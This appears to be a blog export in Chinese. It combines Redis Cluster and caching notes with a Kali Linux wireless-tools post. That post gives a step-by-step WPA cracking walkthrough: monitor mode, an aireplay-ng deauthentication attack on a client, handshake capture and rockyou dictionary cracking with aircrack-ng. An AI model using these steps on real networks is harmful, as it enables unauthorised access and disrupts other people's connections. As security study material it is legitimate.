<h3 id="搭建集群"><a href="#搭建集群" class="headerlink" title="搭建集群"></a>搭建集群</h3><p>Redis Cluster 架构：节点、meet、指派槽、复制</p>
<p>所有节点共享消息</p>
<p>特性：复制、高可用、分片</p>
<p>Redis Cluster 安装：原生命令安装、官方工具安装<br>配置：<br>开启节点：  配置里 cluster-enabled yes ;cluster-config-file nodes-${port}.conf<br>            Redis-server redis-7000.conf<br>meet （节点之际去哪通信）：cluster meet ip port<br>配置槽 : cluster addslots slot [slot …]<br>主从配置 : cluster replicate node-id</p>
<h2 id="集群伸缩"><a href="#集群伸缩" class="headerlink" title="集群伸缩"></a>集群伸缩</h2><h3 id="伸缩原理"><a href="#伸缩原理" class="headerlink" title="伸缩原理"></a>伸缩原理</h3><p>集群伸缩=槽和数据在节点之间的移动</p>
<p>扩容集群：准备新节点、加入集群、迁移槽和数据</p>
<p>准备新节点：<br>集群模式；配置和其他节点统一；启动后是孤儿节点；</p>
<p>加入集群：<br>作用：为它迁移槽和数据实现扩容；作为从节点负责故障转移<br>redis-trib.rb : 使用 rb 能够避免新节点已经加入了其他集群，造成故障。<br>rb 的工作原理、过程：</p>
<p>迁移槽和数据：</p>
<ul>
<li>槽迁移计划：</li>
<li>迁移数据：</li>
<li>添加从节点：</li>
</ul>
<p>迁移数据：</p>
<p><img data-src="http://tuchuang.xchcloud.cn/图30.png" alt="30"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/31.png" alt="31"></p>
<h3 id="收缩集群"><a href="#收缩集群" class="headerlink" title="收缩集群"></a>收缩集群</h3><p>下线迁移槽；<br>忘记节点；cluster forget {id}<br>关闭节点。</p>
<h3 id="客户端路由"><a href="#客户端路由" class="headerlink" title="客户端路由"></a>客户端路由</h3><p>moved 从定向</p>
<p><img data-src="http://tuchuang.xchcloud.cn/图31.png" alt="图31"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/图32.png" alt="图32"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/图33.png" alt="图33"></p>
<p>ask 重定向</p>
<p><img data-src="http://tuchuang.xchcloud.cn/图34.png" alt="图34"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/图35.png" alt="图35"></p>
<p>moved 和 ask 区别：两者都是客户单重定向；moved：槽已确定迁移；ask：槽还在迁移中。</p>
<p>smart 客户端</p>
<p>实现原理：追求性能。<br>1、从集群中选一个可运行节点，使用cluster slots 初始化槽和节点映射<br>2、将cluster slots 的结果映射到本地，为每一个节点创建JedisPool<br>3、准备执行命令</p>
<p><img data-src="http://tuchuang.xchcloud.cn/图36.png" alt="图36"></p>
<p>使用方法：对应的一个 java 客户端</p>
<p>简单案例、整合到spring、多节点命令实现、如何实现批量操作</p>
<p>批量操作如何让实现：</p>
<p>1、串行mget : for 循环遍历所有key<br>2、串行IO ：在客户端对key进行内聚，根据节点分组，通过pipeline执行。<br>3、并行IO： 同上，但是是并行的执行多个pipeline<br>4、hash_tag ： 对key进行包装，mget（hash_key）</p>
<p>对比：</p>
<p><img data-src="http://tuchuang.xchcloud.cn/图37.png" alt="图37"></p>
<h3 id="故障转移"><a href="#故障转移" class="headerlink" title="故障转移"></a>故障转移</h3><p>故障发现<br>1、通过ping/pong消息实现故障发现：不需要sentinel<br>2、主观下线和客观下线</p>
<p>主观下线：</p>
<p><img data-src="http://tuchuang.xchcloud.cn/图38.png" alt="图38"></p>
<p>客观下线：</p>
<p><img data-src="http://tuchuang.xchcloud.cn/图39.png" alt="图39"></p>
<p>尝试客观下线：</p>
<p><img data-src="http://tuchuang.xchcloud.cn/图40.png" alt="图40"></p>
<h3 id="故障恢复"><a href="#故障恢复" class="headerlink" title="故障恢复"></a>故障恢复</h3><h4 id="资格检查："><a href="#资格检查：" class="headerlink" title="资格检查："></a>资格检查：</h4><p>每个从节点检查与故障主节点的断线时间；超过cluster-node-timeout * cluster-slave-validity-factor 取消资格；cluster-slave-validity-factor : 默认是10</p>
<h4 id="准备选举时间："><a href="#准备选举时间：" class="headerlink" title="准备选举时间："></a>准备选举时间：</h4><p><img data-src="http://tuchuang.xchcloud.cn/图41.png" alt="图41"></p>
<h4 id="选举投票："><a href="#选举投票：" class="headerlink" title="选举投票："></a>选举投票：</h4><p><img data-src="http://tuchuang.xchcloud.cn/图42.png" alt="图42"></p>
<h4 id="替换主节点："><a href="#替换主节点：" class="headerlink" title="替换主节点："></a>替换主节点：</h4><p><img data-src="http://tuchuang.xchcloud.cn/图43.png" alt="图43"></p>
<h3 id="故障转移演练"><a href="#故障转移演练" class="headerlink" title="故障转移演练"></a>故障转移演练</h3><h3 id="Redis-Cluster-开发运维常见问题"><a href="#Redis-Cluster-开发运维常见问题" class="headerlink" title="Redis Cluster 开发运维常见问题"></a>Redis Cluster 开发运维常见问题</h3><h4 id="集群完整性"><a href="#集群完整性" class="headerlink" title="集群完整性"></a>集群完整性</h4><ul>
<li><p>cluster-require-full-coverage 默认是 yes</p>
</li>
<li><ul>
<li>集群中16384个槽全部可用：保证集群完整性</li>
</ul>
</li>
<li><ul>
<li>节点故障或者正在故障转移：（error）CLUSTERDOWN the cluster is down</li>
</ul>
</li>
<li><p>大多数业务无法容忍，cluster-require-full-coverage 建议设置为no</p>
</li>
</ul>
<h4 id="宽带消耗"><a href="#宽带消耗" class="headerlink" title="宽带消耗"></a>宽带消耗</h4><p>官方建议：不超过1000个节点<br>ping/pong信息<br>不容忽视的宽带消耗</p>
<p>三个方面：<br>消息发送频率：节点发现与与其他节点最后通信时间超过cluster-node-timeout/2时会直接发送ping消息<br>消息数据量：slots 槽数组（2KB空间）和整个集群1/10的状态数据（10个节点状态数据约1KB）<br>节点部署的机器规模：集群分布的机器越多且每台机器划分的节点数越均匀，则集群内整体的可用宽带越高</p>
<p>一个例子：</p>
<ul>
<li>规模：200个节点、20台物理机（每台10个节点）</li>
<li>cluster-node-timeout = 15000 ,ping/pong 宽带为25Mb</li>
<li>cluster-node-timeout=20000,ping/pong宽带低于15Mb</li>
</ul>
<p>优化：</p>
<p>避免“大”集群：避免多业务使用一个集群，大业务可以多集群。<br>cluster-node-timeout: 宽带和故障转移速度的均衡<br>尽量均匀分配到多机器上：保证高可用和宽带</p>
<h4 id="pub-sub-广播"><a href="#pub-sub-广播" class="headerlink" title="pub/sub 广播"></a>pub/sub 广播</h4><p>问题：publish 在集群每个节点广播：加重宽带<br>解决：单独“走”一套Redis Sentinel</p>
<h4 id="数据倾斜"><a href="#数据倾斜" class="headerlink" title="数据倾斜"></a>数据倾斜</h4><ul>
<li>数据倾斜：内存不均匀</li>
</ul>
<p>1、节点和槽分配不均匀<br>redis-trib.rb info ip:port 查看节点、槽、键值分布<br>redis-trib.rb rebalance ip:port 进行均衡（谨慎使用）</p>
<p>2、不同槽对应键值数量差异较大<br>CRC16正常情况下比较均匀<br>可能存在hash_tag<br>cluster countkeysinslot {slot}获取槽对应键值个数</p>
<p>3、包含bigkey<br>bigkey：例如大的字符串、几百万的元素的hash、set等<br>从节点：redis-cli –bigkeys<br>优化：优化数据结构</p>
<p>4、内存相关配置不一致<br>hash-max-ziplist-value、set-max-inset-entries等<br>优化：定期“检查”配置一致性</p>
<ul>
<li>请求倾斜：热点</li>
</ul>
<p>1、热点 key：重要的 key 或者 bigkey<br>优化：<br>避免 bigkey<br>热键不要用 hash__tag<br>当一致性不高时，可以用本地缓存 + MQ</p>
<h4 id="读写分离"><a href="#读写分离" class="headerlink" title="读写分离"></a>读写分离</h4><p>1、只读链接：集群模式的从节点不接受任何读写请求</p>
<p>重定向到负责槽的主节点<br>readonly命令可以读：连接级别命令</p>
<p>2、读写分离：更佳复杂<br>同样的问题：复制延迟、读取过期数据、从节点故障<br>修改客户端：cluster slaver {nodeId}</p>
<h4 id="数据迁移"><a href="#数据迁移" class="headerlink" title="数据迁移"></a>数据迁移</h4><p>1、官方迁移工具：redis-trib.rb import<br>只能从单机迁移到集群<br>不支持在线迁移：source需要停写<br>不支持断点续传<br>单线程迁移：影响速度</p>
<p>2、在线迁移<br>唯品会：redis-migrate-tool<br>豌豆荚：redis-port</p>
<h4 id="集群-VS-单机"><a href="#集群-VS-单机" class="headerlink" title="集群 VS 单机"></a>集群 VS 单机</h4><p>1、集群限制：key 批量操作支持有限：例如mget、mset必须在一个slot<br>2、Key事务和Lua支持有限：操作的key必须在一个节点上<br>3、key是数据分区的最小粒度：不支持bigkey分区<br>4、不支持多个数据库：集群模式下只有一个db 0<br>5、复制只支持一层：不支持树形复制结构</p>
<p>思考：redis分布式不一定是好的<br>1、redis cluster ：满足容量和性能的拓展性，很多业务“不需要”。<br>大多数时客户端性能会“降低”<br>命令无法跨节点使用：mget、keys、scan、flush、sinter等<br>lua和事务无法跨节点使用<br>客户端维护更复杂：SDK和应用本身消耗（例如更多的连接池）</p>
<p>2、很多场景redis sentinel 已经足够好</p>
<h4 id="集群总结"><a href="#集群总结" class="headerlink" title="集群总结"></a>集群总结</h4><p><img data-src="http://tuchuang.xchcloud.cn/图44.png" alt="图44"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/图45.png" alt="图45"></p>
<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><h3 id="缓存的使用与设计"><a href="#缓存的使用与设计" class="headerlink" title="缓存的使用与设计"></a>缓存的使用与设计</h3><h4 id="缓存的受益与成本"><a href="#缓存的受益与成本" class="headerlink" title="缓存的受益与成本"></a>缓存的受益与成本</h4><p>受益：<br>1、加速读写<br>2、降低后端负载</p>
<p>成本<br>1、数据不一致性<br>2、代码维护成本：多了一层缓存逻辑<br>3、运维成本</p>
<p>使用场景<br>1、降低后端负载<br>2、加速请求响应 ：优化IO响应时间<br>3、大量写合并为批量写 ：计数器先Redis累加再批量写DB</p>
<h4 id="缓存更新策略"><a href="#缓存更新策略" class="headerlink" title="缓存更新策略"></a>缓存更新策略</h4><p>1、LRU/LFU/FIFO算法剔除：例如maxmemory-policy   一致性最差，维护成本低<br>2、超时剔除：例如expire                         一致性较差，维护成本低<br>3、主动更新：开发控制生命周期                    一致性强，维护成本高</p>
<p>建议：<br>1、低一致性：最大内存和淘汰策略<br>2、高一致性：超时剔除和主动更新结合，最大内存和淘汰策略兜底。</p>
<h4 id="缓存粒度控制"><a href="#缓存粒度控制" class="headerlink" title="缓存粒度控制"></a>缓存粒度控制</h4><p><img data-src="http://tuchuang.xchcloud.cn/图46.png" alt="图46"></p>
<p>控制的三个角度：<br>1、通用性：全量属性最好<br>2、占用空间：部分属性更好<br>3、代码维护、表面上全量属性更好</p>
<h4 id="缓存透彻优化"><a href="#缓存透彻优化" class="headerlink" title="缓存透彻优化"></a>缓存透彻优化</h4><p>问题：大量请求不命中</p>
<p>原因：<br>1、业务代码自身问题<br>2、恶意攻击、爬虫等等</p>
<p>如何发现：</p>
<p>1、业务的相应时间<br>2、业务本身问题<br>3、相关指标：总调用数</p>
<p>解决方法：<br>1、缓存空对象  ？？？？</p>
<ul>
<li>需要更多的键</li>
<li>缓存层和存储层数据“短期”不一致</li>
</ul>
<p>2、布隆过滤器拦截   ？？？？</p>
<h4 id="无底洞问题优化"><a href="#无底洞问题优化" class="headerlink" title="无底洞问题优化"></a>无底洞问题优化</h4><p>问题：加机器性能没能提升反而下降了。（量太大）</p>
<p>问题关键点：<br>更多的机器不等于更高的性能<br>批量接口需求<br>数据增长和水平拓展需求</p>
<p>优化IO方法：<br>1、命令本身优化：慢查询、hgetall bigkey<br>2、减少网络通信次数<br>3、降低接口成本：例如客户端长连接/连接池、NIO等。</p>
<p>4种批量优化的方法：<br>1、串行mget<br>2、串行IO<br>3、并行IO<br>4、hash_tag</p>
<h4 id="缓存雪崩问题"><a href="#缓存雪崩问题" class="headerlink" title="缓存雪崩问题"></a>缓存雪崩问题</h4><h4 id="热点key重建优化"><a href="#热点key重建优化" class="headerlink" title="热点key重建优化"></a>热点key重建优化</h4><p>问题描述：热点key + 较长的重建时间</p>
<p><img data-src="http://tuchuang.xchcloud.cn/图47.png" alt="图47"></p>
<p>三个目标和两个解决：<br>1、三个目标<br>减少重缓存的次数<br>数据尽可能一致<br>减少潜在危险</p>
<p>2、两个解决<br>互斥锁<br><img data-src="http://tuchuang.xchcloud.cn/图48.png" alt="图48"><br>永远不过期<br>缓存层面：没有设置过期时间（没有用expire）<br>功能层面：为每一个value添加逻辑过期时间，单发现超过逻辑过期时间后，会使用单独的线程去构建缓存。<br><img data-src="http://tuchuang.xchcloud.cn/图49.png" alt="图49"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/图50.png" alt="图50"></p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p><img data-src="http://tuchuang.xchcloud.cn/图51.png" alt="图51"><br><img data-src="http://tuchuang.xchcloud.cn/图52.png" alt="图52"></p>
<h2 id="Redis-云平台-Cachcloud"><a href="#Redis-云平台-Cachcloud" class="headerlink" title="Redis 云平台 Cachcloud"></a>Redis 云平台 Cachcloud</h2><h3 id="Redis-规模化运维"><a href="#Redis-规模化运维" class="headerlink" title="Redis 规模化运维"></a>Redis 规模化运维</h3><p>遇到的问题：<br>发布构建繁琐，私搭乱盖<br>节点&amp;机器等运维成本<br>监控报警初级</p>
<p>使用场景：<br>1、全量视频缓存（视频播放API）：跨机房高可用<br>2、消息队列同步（RedisMQ中间件）<br>3、分布式布隆过滤器（百万QPS）<br>4、技术系统：计数（播放值）<br>5、其他：排行榜、社交（直播、实时计算（反作弊）等）</p>
<h4 id="CacheCloud"><a href="#CacheCloud" class="headerlink" title="CacheCloud"></a>CacheCloud</h4><p>1、一键开启 Redis<br>2、机器、应用、实例监控和报警<br>3、客户端：透明使用、性能上报<br>4、可视化运维：配置、扩容、Failover、机器/应用/实例上下线<br>5、已经存在redis直接接入和数据迁移</p>
<h3 id="快速构建"><a href="#快速构建" class="headerlink" title="快速构建"></a>快速构建</h3><p>略</p>
<h3 id="机器部署"><a href="#机器部署" class="headerlink" title="机器部署"></a>机器部署</h3><p>略</p>
<h3 id="应用接入"><a href="#应用接入" class="headerlink" title="应用接入"></a>应用接入</h3><p>略</p>
<h3 id="用户功能"><a href="#用户功能" class="headerlink" title="用户功能"></a>用户功能</h3><p>略</p>
<h3 id="运维功能"><a href="#运维功能" class="headerlink" title="运维功能"></a>运维功能</h3><p>略</p>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>1、Redis 初识：单机安装部署（版本选择），边界（使用场景）<br>2、API理解和使用：单线程、5种数据结构使用和选择<br>3、Redis客户端使用：jedis、redis-py等，客户端很“简单”。<br>4、瑞士军刀Redis：慢查询、pipeline、发布订阅、bitmap等<br>5、Redis 持久化：RDB和AOF的优缺点和最佳实践<br>6、Redis复制：配置方法、全量和部分复制、常见运维<br>7、Redis Sentinel ： 高可用、架构、“新”的客户端、基本原理<br>8、Redis Cluster ： 数据分布、架构、安装部署、扩容、客户端、常见问题<br>9、缓存设计与优化：粒度、更新策略、无底洞问题、穿透、雪崩、热点key<br>10、CacheCloud ： 平台化Redis开发运维工具</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Sonar</title>
    <url>/Sonar/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入访问密匙</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      <categories>
        <category>Sonar</category>
      </categories>
      <tags>
        <tag>Sonar</tag>
      </tags>
  </entry>
  <entry>
    <title>kali-linux工具简介</title>
    <url>/kali-linux%E5%B7%A5%E5%85%B7%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<h1 id="工具集合"><a href="#工具集合" class="headerlink" title="工具集合"></a>工具集合</h1><h2 id="无线攻击篇"><a href="#无线攻击篇" class="headerlink" title="无线攻击篇"></a>无线攻击篇</h2><p>持续更新中～  下次更新尽量一个月内吧，有些地方还是晦涩难懂。</p>
<h3 id="蓝牙工具集合"><a href="#蓝牙工具集合" class="headerlink" title="蓝牙工具集合"></a>蓝牙工具集合</h3><a id="more"></a>
<h3 id="无线工具集合"><a href="#无线工具集合" class="headerlink" title="无线工具集合"></a>无线工具集合</h3><h4 id="iwconfig"><a href="#iwconfig" class="headerlink" title="iwconfig"></a>iwconfig</h4><p>系统配置无线网络设备或显示无线网络设备信息的命令。iwconfig命令类似于ifconfig命令，但是他配置对象是无线网卡，它对网络设备进行无线操作，如设置无线通信频段</p>
<h5 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h5><p><code>iwconfig interface [选项]</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage: iwconfig [interface]</span><br><span class="line">	interface essid &#123;NNN|any|on|off&#125;</span><br><span class="line">	interface mode &#123;managed|ad-hoc|master|...&#125;</span><br><span class="line">	interface freq N.NNN[k|M|G]</span><br><span class="line">	interface channel N</span><br><span class="line">	interface bit &#123;N[k|M|G]|auto|fixed&#125;</span><br><span class="line">	interface rate &#123;N[k|M|G]|auto|fixed&#125;</span><br><span class="line">	interface enc &#123;NNNN-NNNN|off&#125;</span><br><span class="line">	interface key &#123;NNNN-NNNN|off&#125;</span><br><span class="line">	interface power &#123;period N|timeout N|saving N|off&#125;</span><br><span class="line">	interface nickname NNN</span><br><span class="line">	interface nwid &#123;NN|on|off&#125;</span><br><span class="line">	interface ap &#123;N|off|auto&#125;</span><br><span class="line">	interface txpower &#123;NmW|NdBm|off|auto&#125;</span><br><span class="line">	interface sens N</span><br><span class="line">	interface retry &#123;limit N|lifetime N&#125;</span><br><span class="line">	interface rts &#123;N|auto|fixed|off&#125;</span><br><span class="line">	interface frag &#123;N|auto|fixed|off&#125;</span><br><span class="line">	interface modulation &#123;11g|11a|CCK|OFDMg|...&#125;</span><br><span class="line">	interface commit </span><br><span class="line"></span><br><span class="line">    auto： 自动模式</span><br><span class="line">    essid：设置ESSID  //设置ESSID(或网络名称——在某些产品中也可以称为域ID)。ESSID用于标识属于同一虚拟网络的单元。与定义单个单元的AP地址或NWID不同，ESSID定义了通过中继器或基础设施连接的一组单元，用户可以在这些单元中透明地漫游。对于某些卡片，您可以使用off或any(和on来重新启用它)禁用ESSID检查(ESSID混杂)。如果您的网络的ESSID是一个特殊的关键字(off、on或any)，您应该使用——以转义它。</span><br><span class="line">    nwid：设置网络ID  // 设置网络ID。由于所有相邻的无线网络共享相同的介质，该参数用于区分它们(创建逻辑并列网络)并识别属于同一单元的节点。此参数仅用于802.11之前的硬件，802.11协议使用此功能的ESSID和AP地址。对于某些卡，可以使用off(和on)禁用网络ID检查(NWID混杂)来重新启用它。</span><br><span class="line">    freq： 设置无线网络通信频段/率</span><br><span class="line">    chanel： 设置无线网络通信信道   </span><br><span class="line">    sens： 设置无线网络设备的感知阀值 //适当设置这些阈值可以防止卡在接收微弱信号的同时浪费时间在背景噪声上。默认现在硬件感知都自动化了吧。</span><br><span class="line">    mode： 设置无线网络设备的通信设备</span><br><span class="line">    ap： 强迫无线网卡向给定地址的接入点注册 /使用off来重新启用自动模式，而不需要更改当前的访问点，或者您可以使用any或auto来强制卡与当前最佳的访问点重新关联。</span><br><span class="line">    nick&lt;名字&gt;： 为网卡设定别名</span><br><span class="line">    rate&lt;速率&gt;： 设定无线网卡的速率</span><br><span class="line">    rts&lt;阀值&gt;： 在传输数据包之前增加一次握手，确信信道在正常的</span><br><span class="line">    power： 无线网卡的发射功率设置</span><br><span class="line">    总结：保持默认吧，又不是老古董的网卡了，有特殊需求，恶劣条件下可考虑极限值尝试？</span><br></pre></td></tr></table></figure></p>
<h4 id="Aircrack-ng"><a href="#Aircrack-ng" class="headerlink" title="Aircrack-ng"></a>Aircrack-ng</h4><h5 id="参数说明-1"><a href="#参数说明-1" class="headerlink" title="参数说明"></a>参数说明</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; Executing “aircrack-ng --help”</span><br><span class="line"></span><br><span class="line">  Aircrack-ng 1.6  - (C) 2006-2020 Thomas d&apos;Otreppe</span><br><span class="line">  https://www.aircrack-ng.org</span><br><span class="line"></span><br><span class="line">  usage: aircrack-ng [options] &lt;input file(s)&gt;</span><br><span class="line"></span><br><span class="line">  Common options:</span><br><span class="line"></span><br><span class="line">      -a &lt;amode&gt; : force attack mode (1/WEP, 2/WPA-PSK)           //强制攻击模式</span><br><span class="line">      -e &lt;essid&gt; : target selection: network identifier                        //目标选择：网络标识符</span><br><span class="line">      -b &lt;bssid&gt; : target selection: access point&apos;s MAC                     //目标选择：通过接入点的MAC</span><br><span class="line">      -p &lt;nbcpu&gt; : # of CPU to use  (default: all CPUs)                    //使用的CPU数量；默认全部</span><br><span class="line">      -q         : enable quiet mode (no status output)                          //启用安静模式（无状态输出）</span><br><span class="line">      -C &lt;macs&gt;  : merge the given APs to a virtual one                   //将给定的AP合并为虚拟AP</span><br><span class="line">      -l &lt;file&gt;  : write key to file. Overwrites file.                             //重写文件，将秘匙写入文件中</span><br><span class="line"></span><br><span class="line">  Static WEP cracking options:                                                        //静态WEP破解选项：</span><br><span class="line"></span><br><span class="line">      -c         : search alpha-numeric characters only</span><br><span class="line">      -t         : search binary coded decimal chr only</span><br><span class="line">      -h         : search the numeric key for Fritz!BOX</span><br><span class="line">      -d &lt;mask&gt;  : use masking of the key (A1:XX:CF:YY)</span><br><span class="line">      -m &lt;maddr&gt; : MAC address to filter usable packets</span><br><span class="line">      -n &lt;nbits&gt; : WEP key length :  64/128/152/256/512</span><br><span class="line">      -i &lt;index&gt; : WEP key index (1 to 4), default: any</span><br><span class="line">      -f &lt;fudge&gt; : bruteforce fudge factor,  default: 2</span><br><span class="line">      -k &lt;korek&gt; : disable one attack method  (1 to 17)</span><br><span class="line">      -x or -x0  : disable bruteforce for last keybytes</span><br><span class="line">      -x1        : last keybyte bruteforcing  (default)</span><br><span class="line">      -x2        : enable last  2 keybytes bruteforcing</span><br><span class="line">      -X         : disable  bruteforce   multithreading</span><br><span class="line">      -y         : experimental  single bruteforce mode</span><br><span class="line">      -K         : use only old KoreK attacks (pre-PTW)</span><br><span class="line">      -s         : show the key in ASCII while cracking</span><br><span class="line">      -M &lt;num&gt;   : specify maximum number of IVs to use</span><br><span class="line">      -D         : WEP decloak, skips broken keystreams</span><br><span class="line">      -P &lt;num&gt;   : PTW debug:  1: disable Klein, 2: PTW</span><br><span class="line">      -1         : run only 1 try to crack key with PTW</span><br><span class="line">      -V         : run in visual inspection mode</span><br><span class="line"></span><br><span class="line">  WEP and WPA-PSK cracking options:</span><br><span class="line"></span><br><span class="line">      -w &lt;words&gt; : path to wordlist(s) filename(s)</span><br><span class="line">      -N &lt;file&gt;  : path to new session filename</span><br><span class="line">      -R &lt;file&gt;  : path to existing session filename</span><br><span class="line"></span><br><span class="line">  WPA-PSK options:</span><br><span class="line"></span><br><span class="line">      -E &lt;file&gt;  : create EWSA Project file v3</span><br><span class="line">      -I &lt;str&gt;   : PMKID string (hashcat -m 16800)</span><br><span class="line">      -j &lt;file&gt;  : create Hashcat v3.6+ file (HCCAPX)</span><br><span class="line">      -J &lt;file&gt;  : create Hashcat file (HCCAP)</span><br><span class="line">      -S         : WPA cracking speed test</span><br><span class="line">      -Z &lt;sec&gt;   : WPA cracking speed test length of</span><br><span class="line">                   execution.</span><br><span class="line">      -r &lt;DB&gt;    : path to airolib-ng database</span><br><span class="line">                   (Cannot be used with -w)</span><br><span class="line"></span><br><span class="line">  SIMD selection:</span><br><span class="line"></span><br><span class="line">      --simd-list       : Show a list of the available</span><br><span class="line">                          SIMD architectures, for this</span><br><span class="line">                          machine.</span><br><span class="line">      --simd=&lt;option&gt;   : Use specific SIMD architecture.</span><br><span class="line"></span><br><span class="line">      &lt;option&gt; may be one of the following, depending on</span><br><span class="line">      your platform:</span><br><span class="line"></span><br><span class="line">                   generic</span><br><span class="line">                   avx512</span><br><span class="line">                   avx2</span><br><span class="line">                   avx</span><br><span class="line">                   sse2</span><br><span class="line">                   altivec</span><br><span class="line">                   power8</span><br><span class="line">                   asimd</span><br><span class="line">                   neon</span><br><span class="line"></span><br><span class="line">  Other options:</span><br><span class="line"></span><br><span class="line">      -u         : Displays # of CPUs &amp; SIMD support</span><br><span class="line">      --help     : Displays this usage screen</span><br></pre></td></tr></table></figure>
<h5 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h5><h6 id="DEAUTHENTICATION攻击"><a href="#DEAUTHENTICATION攻击" class="headerlink" title="DEAUTHENTICATION攻击"></a>DEAUTHENTICATION攻击</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aireplay-ng -0 0 -a kifi -c &lt;Client MAC&gt; &lt;interface name&gt;</span><br></pre></td></tr></table></figure>
<p>0就是无限发包，直至打掉<br>    不指定-c参数时，以广播攻击所有客户端<br>    每攻击发送128个包，64个给AP，64个给客户端<br>    物理足够接近被攻击者<br>排错：<br>物理足够接近被攻击者<br>与被攻击者使用相同无限标准b、n、g<br>客户端可能拒绝广播帧，建议指定客户端</p>
<p>实战步骤：<br>    查看网卡名字：iwconfig<br>    设置网卡为监听模式：airmon-ng  start wlan0<br>    扫描附近的WIFI：airodump-ng  wlan0mon<br>    选定一个路由器，并监听其流量：airodump-ng -w tplink -c 11 –bssid {MAC1} wlan0mon<br>    选定连接的一个客户端，进行攻击：aireplay-ng -0 50 -a {MAC1} -c {MAC2}  wlan0mon<br>    对抓取到的cap包进行暴力破解：aircrack-ng  -w  password.txt  -b {MAC1} tplink-01.cap<br>参考：</p>
<ol>
<li><p>查看无线网卡名字：iwconfig   或者  ifconfig  -a   都可以</p>
</li>
<li><p>开启网卡监听模式：airmon-ng  start wlan0   。<br> 网卡开启了监听模式之后网卡的名字就变为 wlan0mon  了，以后的所有命令中的网卡名都是叫 wlan0mon</p>
</li>
<li><p>扫描附近的WIFI：airodump-ng  wlan0mon<br> 会显示附近所有的WIFI信号。<br>显示数据的参数说明：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BSSID ：AP端的MAC地址，如果在Client Section中BSSID显示为“not associated”意味着客户端没有和AP连接上</span><br><span class="line">PWR ：信号的水平强度，越大越好</span><br><span class="line">Beacons ：AP发出的通告编号，每个接入点（AP）在最低速率（1M）时差不多每秒发送10个左右的beacon，所以他们能够在很远的地方被发现</span><br><span class="line">#Data： 对应路由器在线吞吐量，数字越大，数据上传量越大（数据越大表示在正常情况下使用的人越多，选择此目标成功率大些</span><br><span class="line">CH ：信号道（对应路由器的所在频道 / 渠道）</span><br><span class="line">MB ：连接速度 / AP支持的最大速率，如果：</span><br><span class="line">  +MB=11，它是802.11b</span><br><span class="line">  +MB=22，它是802.11b+</span><br><span class="line">  +MB&gt;22，它是802.11g</span><br><span class="line">ENC ：使用的加密算法体系</span><br><span class="line">CIPHER ：检测到的加密算法</span><br><span class="line">AUTH ：使用的认证协议</span><br><span class="line">  +MGT（WPA/WPA2使用独立认证的服务器，常见的802.1x、redius、eap等）</span><br><span class="line">  +SKA（WEP的共享密钥）</span><br><span class="line">  +OPN（WEP开放式）</span><br><span class="line">ESSID ：对应的路由器名称（越往上信号越好）</span><br><span class="line">STATION ：客户端的MAC地址</span><br><span class="line">Lost ：在过去10s丢失的数据分组</span><br><span class="line">Probes ：被客户端查探的ESSID，如果客户端正在试图连接一个AP但是没有连接上，那么就显示在这里。</span><br><span class="line">RXQ ：接受质量，用于衡量所有帧和管理所有帧</span><br></pre></td></tr></table></figure>
</li>
<li><p>选定一个准备破解的WIFI</p>
</li>
<li><p>监听该路由器的流量：<br><code>airodump-ng -w tplink -c 11 --bssid BC:46:99:3D:66:D6 wlan0mon   # -w 参数指定生成的文件名  -c 指定信道 --bssid指定路由器的MAC地址</code></p>
</li>
<li><p>重新打开一个命令行窗口，开始攻击！之前的窗口继续保留，用于观察是否抓包成功<br><code>aireplay-ng -0 50 -a BC:46:99:3D:66:D6 -c A0:AF:BD:D8:E6:31  wlan0mon  # 50是发包的数量 -a指定路由器的MAC地址  -c指定连接的客户端的MAC地址</code><br> 该命令会打断连接客户端和WIFI之间的连接，等到客户端重新连接WIFI的时候，就会抓取他们之间的握手认证包！ </p>
</li>
<li><p>如果看到[ WPA handshake: MAC]，就说明握手包抓取成功了</p>
<p> 我们可以在命令行运行的所在目录下，看到会生成四个文件，其中我们有用的文件是以 cap 后缀结尾的文件</p>
</li>
<li><p>对抓取到的cap包进行破解，这需要我们准备好破解的密码字典。所以，无论是任何破解，都需要一个强大的密码字典！</p>
<p> kali下自带有一份无线密码字典——&gt; /usr/share/wordlists/rockyou.txt.gz ，我们将其解压</p>
<p> <code>aircrack-ng  -w  /usr/share/wordlists/rockyou.txt  -b  BC:46:99:3D:66:D6 tplink-01.cap #-w指定 密码字典 -b指定路由器的MAC地址</code></p>
<p> 要想破解出WIFI的密码，需要一个很强大的字典！</p>
</li>
</ol>
<h5 id="其他使用说明"><a href="#其他使用说明" class="headerlink" title="其他使用说明"></a>其他使用说明</h5><p>就是采取不同的漏洞进行破解<br><code>aireplay-ng -0 10 -a ap_mac -c 合法客户端mac wifi0</code></p>
